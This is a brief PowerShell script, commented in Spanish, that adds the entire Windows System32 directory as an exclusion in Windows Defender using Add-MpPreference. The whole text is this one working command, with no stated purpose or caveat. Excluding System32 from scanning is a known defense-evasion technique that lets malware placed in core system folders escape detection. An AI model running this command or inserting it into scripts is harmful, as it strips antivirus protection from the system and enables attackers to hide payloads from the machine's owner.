# Excluir todo el directorio System32 en Windows Defender

# Ruta del directorio System32
$system32Path = "$env:SystemRoot\System32\"

# Agregar el directorio como exclusión en Windows Defender
Add-MpPreference -ExclusionPath $system32Path
